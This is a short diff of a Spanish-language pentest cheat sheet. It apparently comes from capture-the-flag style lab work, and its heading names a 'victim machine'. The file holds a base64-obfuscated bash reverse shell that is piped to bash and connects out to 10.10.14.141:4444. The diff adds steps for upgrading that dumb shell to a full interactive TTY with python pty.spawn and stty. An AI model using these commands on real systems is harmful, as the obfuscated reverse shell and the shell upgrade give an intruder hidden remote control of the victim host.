@@ -9,3 +9,26 @@ Maquina victima:
 
 echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDEvNDQ0NCAwPiYxCg==' | base64 -d | bash
 
+
+
+-------------------------------------------
+ UPGRADE DE SHELL (reverse shell dumb → TTY)
+-------------------------------------------
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Ctrl+z 
+
+stty raw -echo; fg
+export TERM=xterm
+export SHELL=bash
+
+
+
+
+
+
+
+
+
+
